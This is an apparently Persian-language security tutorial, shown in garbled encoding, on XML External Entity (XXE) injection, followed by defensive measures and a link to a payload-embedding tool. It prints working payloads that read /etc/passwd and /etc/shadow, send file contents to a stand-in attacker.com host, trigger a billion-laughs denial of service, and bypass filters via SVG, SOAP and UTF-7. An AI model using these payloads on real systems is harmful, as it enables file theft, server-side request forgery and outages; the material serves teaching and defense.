๐ ุญููุงุช XXE (ุชุฒุฑู XML) - ุจุฎุด ุงูู  

๐นุญููู XXE ฺุณุชุ  
ุญูู XXE (XML External Entity Injection) ฺฉ ุขุณุจโูพุฐุฑ ุงููุช ุฏุฑ ูพุฑุฏุงุฒุด ุฏุงุฏูโูุง XML ุงุณุช ฺฉู ุจู ููุงุฌู ุงุฌุงุฒู ูโุฏูุฏ ุจู ูุงูโูุง ุณุณุชู ุณุฑูุฑ ุฏุณุชุฑุณ ูพุฏุง ฺฉูุฏ ุง ุจุง ุณุณุชูโูุง backend ุชุนุงูู ุฏุงุดุชู ุจุงุดุฏ. ุฏุฑ ุจุฑุฎ ููุงุฑุฏุ ุงู ุขุณุจโูพุฐุฑ ูโุชูุงูุฏ ููุฌุฑ ุจู ุญูููโูุง ุฌุนู ุฏุฑุฎูุงุณุช ุณูุช ุณุฑูุฑ (SSRF) ุง ุญุช ุงุฎุชูุงู ุฏุฑ ุณุฑูุณ (DoS) ุดูุฏ.  

๐น ุงููุงุน ุญููุงุช XXE   
1. ุงุณุชุฎุฑุงุฌ ูุงูโูุง (ูุซูุงู ุฎูุงูุฏู /etc/passwd)  
2. ุญููุงุช SSRF (ุงุฑุณุงู ุฏุฑุฎูุงุณุช ุจู ุณุณุชูโูุง ุฏุงุฎู)  
3. ุงูุชูุงู ุฏุงุฏูโูุง ุจู ุตูุฑุช ุฎุงุฑุฌ ุงุฒ ุจุงูุฏ (OOB)  
4. ุงุณุชุฎุฑุงุฌ ุฏุงุฏู ุงุฒ ุทุฑู ูพุงูโูุง ุฎุทุง  

๐น ูุซุงู ุณุงุฏู ุงุฒ XXE:  
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
ุฏุฑ ุงู ูุซุงูุ ููุงุฌู ูุญุชูุง ูุงู /etc/passwd ุฑุง ูโุฎูุงูุฏ.  

๐ ุญููุงุช XXE (ุชุฒุฑู XML) - ุจุฎุด ุฏูู  

๐น ุญููุงุช ูพุดุฑูุชู XXE  

 1. ุญููุงุช Blind XXE (ุงูุชูุงู ุฏุงุฏู ุจู ุตูุฑุช ุฎุงุฑุฌ ุงุฒ ุจุงูุฏ)  
ุฏุฑ ุจุฑุฎ ููุงุฑุฏุ ุจุฑูุงูู ูพุงุณุฎ ูุณุชูู ูุดุงู ููโุฏูุฏุ ุงูุง ููุงุฌู ูโุชูุงูุฏ ุฏุงุฏูโูุง ุฑุง ุจู ฺฉ ุณุฑูุฑ ุชุญุช ฺฉูุชุฑู ุฎูุฏ ููุชูู ฺฉูุฏ.  

ูุซุงู:  
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY blind SYSTEM "http://attacker.com/?%xxe;">
]>
<foo>&blind;</foo>
ุฏุฑ ุงู ุญุงูุชุ ูุญุชูุง /etc/passwd ุจู ุณุฑูุฑ ููุงุฌู ุงุฑุณุงู ูโุดูุฏ.  

2. ุฏูุฑ ุฒุฏู ฺฉูุชุฑูโูุง ุฏุณุชุฑุณ (PHP Example)  
ุจุง ุงุณุชูุงุฏู ุงุฒ ููุชุฑูุง PHPุ ูโุชูุงู ูุงูโูุง ูุญุฏูุฏุดุฏู ุฑุง ุฎูุงูุฏ:  
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/shadow">
]>
<foo>&ac;</foo>
(ุฏุฑ ุงู ูุซุงูุ ูุงู /etc/shadow ุจู ุตูุฑุช base64 ฺฉุฏฺฏุฐุงุฑ ู ุฎูุงูุฏู ูโุดูุฏ.)  

 3. ุญููุงุช DoS ุจุง XXE 
ุจุนุถ ุงุฒ payloadูุง XXE ูโุชูุงููุฏ ุจุงุนุซ ูุตุฑู ุจุด ุงุฒ ุญุฏ ููุงุจุน ุณุฑูุฑ ุดููุฏ:  
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  ...
]>
<lolz>&lol9;</lolz>
ุงู ุญููู ุจุงุนุซ ุงุฌุงุฏ ุญุฌู ุฒุงุฏ ุงุฒ ุฏุงุฏูโูุง ุชฺฉุฑุงุฑ ู crash ุณุฑูุฑ ูโุดูุฏ.  

๐ ุญููุงุช XXE (ุชุฒุฑู XML) - ุจุฎุด ุณููย 

๐น ุญููุงุช ูพุดุฑูุชู XXE (ุงุฏุงูู)ย 

4. ุงุณุชูุงุฏู ุงุฒ XXE ุฏุฑ ูุงูโูุง SVG (ุญููุงุช ุงุฒ ุทุฑู ุชุตุงูุฑ)ย 
ูุงูโูุง SVG ูุจุชู ุจุฑ XML ูุณุชูุฏ ู ูโุชูุงููุฏ ุญุงู payloadูุง XXE ุจุงุดูุฏ:ย 
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">
ยยย <image xlink:href="expect://id"></image>
</svg>
ุงฺฏุฑ ุณุงุช ุขูพููุฏ SVG ุฑุง ุจุฏูู ููุชุฑ ฺฉุฑุฏู ุงุฌุงุฒู ุฏูุฏุ ุงู payload ูโุชูุงูุฏ ุฏุณุชูุฑุงุช ุณุณุชู ุฑุง ุงุฌุฑุง ฺฉูุฏ.ย 

5. ุงุณุชูุงุฏู ุงุฒ XXE ุฏุฑ ูพุฑูุชฺฉู SOAP (ุณุฑูุณโูุง ูุจ)ย 
ุฏุฑ APIูุง SOAP-based ูุฒ ูโุชูุงู ุงุฒ XXE ุณูุกุงุณุชูุงุฏู ฺฉุฑุฏ:ย 
<soap:Body>
ย <foo>
ยยย <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/"> %dtd;]><xxx/>]]>
ย </foo>
</soap:Body>
ุงู payload ุฏุฑุฎูุงุณุช ุจู ุณุฑูุฑ ููุงุฌู ุงุฑุณุงู ูโฺฉูุฏ.ย 

6. ุงุณุชูุงุฏู ุงุฒ ฺฉุฏฺฏุฐุงุฑ UTF-7 ุจุฑุง ุฏูุฑ ุฒุฏู ููุชุฑูุงย 
ุจุนุถ ุณุณุชูโูุง ููุท UTF-8 ุฑุง ูพุฑุฏุงุฒุด ูโฺฉููุฏุ ุงูุง ุจุง UTF-7 ูโุชูุงู ุจุฑุฎ ููุชุฑูุง ุฑุง ุฏูุฑ ุฒุฏ:ย 
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hacker.com/+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4

๐น ุฌูุนโุจูุฏ ุจุฎุด ุณููย 
- ุฏุฑูู SVGูุง ูโุชูุงููุฏ ุญุงู XXE ุจุงุดูุฏ.ย 
-ุญุช APIูุง SOAP ูุฒ ุฏุฑ ูุนุฑุถ ุฎุทุฑูุฏ.ย 
- ุจุง ุชุบุฑ ฺฉุฏฺฏุฐุงุฑ (ูุซู UTF-7) ูโุชูุงู ุจุฑุฎ ููุชุฑูุง ุฑุง ุฏูุฑ ุฒุฏ.ย 

ุงุฏุงูู ุฏุฑ ุจุฎุด ฺูุงุฑู (ูพุดฺฏุฑ ู ุฏูุงุน)...

๐ ุญููุงุช XXE (ุชุฒุฑู XML) - ุจุฎุด ฺูุงุฑู (ูพุงุงู)ย 

๐น ุฑูุดโูุง ูพุดฺฏุฑ ู ุฏูุงุน ุฏุฑ ุจุฑุงุจุฑ XXEย 

1. ุบุฑูุนุงู ฺฉุฑุฏู ูพุฑุฏุงุฒุด ููุฌูุฏุชโูุง ุฎุงุฑุฌ (External Entities)ย 
ุฏุฑ ุงฺฉุซุฑ ูพุฑุฏุงุฒุดฺฏุฑูุง XML (ูุซู PHP, Java, .NET)ุ ูโุชูุงู ุงู ูฺฺฏ ุฑุง ุบุฑูุนุงู ฺฉุฑุฏ:ย 

ูุซุงู ุฏุฑ PHP:ย 
libxml_disable_entity_loader(true);

ูุซุงู ุฏุฑ Python (lxml):ย 
parser = etree.XMLParser(resolve_entities=False)

2. ุงุณุชูุงุฏู ุงุฒ Whitelisting ุจุฑุง ูุฑูุฏโูุง XMLย 
- ููุท ุงุฌุงุฒูโุฏูุฏ ุงููุงูโูุง ู attributeูุง ููุฑุฏ ุงุนุชูุงุฏ ูพุฑุฏุงุฒุด ุดููุฏ.ย 
- ุงุฒ ุงุณฺฉูุงูุง ูุนุชุจุฑ (XSD) ุจุฑุง ุงุนุชุจุงุฑุณูุฌ ุณุงุฎุชุงุฑ XML ุงุณุชูุงุฏู ฺฉูุฏ.ย 

3. ููุชุฑ ฺฉุฑุฏู ูุญุชูุง ุฎุทุฑูุงฺฉย 
- ุจููฺฉ ฺฉุฑุฏู <!DOCTYPE ู <!ENTITY ุฏุฑ ูุฑูุฏ ฺฉุงุฑุจุฑ.ย 
- ูุณุฏูุฏ ฺฉุฑุฏู ูพุฑูุชฺฉูโูุง ุฎุทุฑูุงฺฉ ูุซู file://, php://, expect://.ย 

4. ุจูโุฑูุฒุฑุณุงู ฺฉุชุงุจุฎุงููโูุง ูพุฑุฏุงุฒุด XMLย 
ุจุณุงุฑ ุงุฒ ุขุณุจโูพุฐุฑโูุง XXE ุฏุฑ ูุณุฎูโูุง ูุฏู ฺฉุชุงุจุฎุงููโูุง (ูุซู libxml2) ูุฌูุฏ ุฏุงุฑูุฏ.ย 

5. ุงุณุชูุงุฏู ุงุฒ ูุฑูุชโูุง ุฌุงฺฏุฒู (JSON ุจู ุฌุง XML)ย 
ุฏุฑ ุจุณุงุฑ ุงุฒ ููุงุฑุฏุ ุงุณุชูุงุฏู ุงุฒ JSON ุจู ุฌุง XML ูโุชูุงูุฏ ุฎุทุฑ XXE ุฑุง ุญุฐู ฺฉูุฏ.ย 

๐น ูุชุฌูโฺฏุฑย 
ุญููุงุช XXE ูโุชูุงููุฏ ููุฌุฑ ุจู ุฎูุงูุฏู ูุงูโูุง ุญุณุงุณุ ุญููุงุช SSRF ู ุญุช ุงุฎุชูุงู ุฏุฑ ุณุฑูุณ (DoS) ุดููุฏ. ุจุง ุบุฑูุนุงู ฺฉุฑุฏู ููุฌูุฏุชโูุง ุฎุงุฑุฌ ู ุงุนุชุจุงุฑุณูุฌ ุฏูู ูุฑูุฏโูุงุ ูโุชูุงู ุงุฒ ุงู ุญููุงุช ุฌููฺฏุฑ ฺฉุฑุฏ.ย 

โ ุงููโุชุฑ ฺฉุฏููุณ ฺฉูุฏ! โย 

โ๏ธููุณูุฏู 
@TryHackBox | The Chaos

#XXE #Prevention #CyberSecurity


===================================

ุงุจุฒุงุฑ docem ุงุจุฒุงุฑ ุงุณุช ฺฉู ุจุฑุง ฺฏูุฌุงูุฏู Payloadูุง XXE  ู XSS ุฏุฑ ูุงูุจโูุง ุณูุฏ ูุงููุฏ docx, odt, pptx, xlsx ุงุณุชูุงุฏู ูโุดูุฏ. ุงู ูุฑูุชโูุง ุณูุฏ ุฏุฑ ูุงูุน ูุงูโูุง ZIP ุญุงู ูุงูโูุง XML ูุณุชูุฏุ ุจู ููู ุฏูู ุงูฺฉุงู ุชุฒุฑู ุงู ููุน ุญููุงุช ูุฌูุฏ ุฏุงุฑุฏ.

https://github.com/whitel1st/docem

=====================================
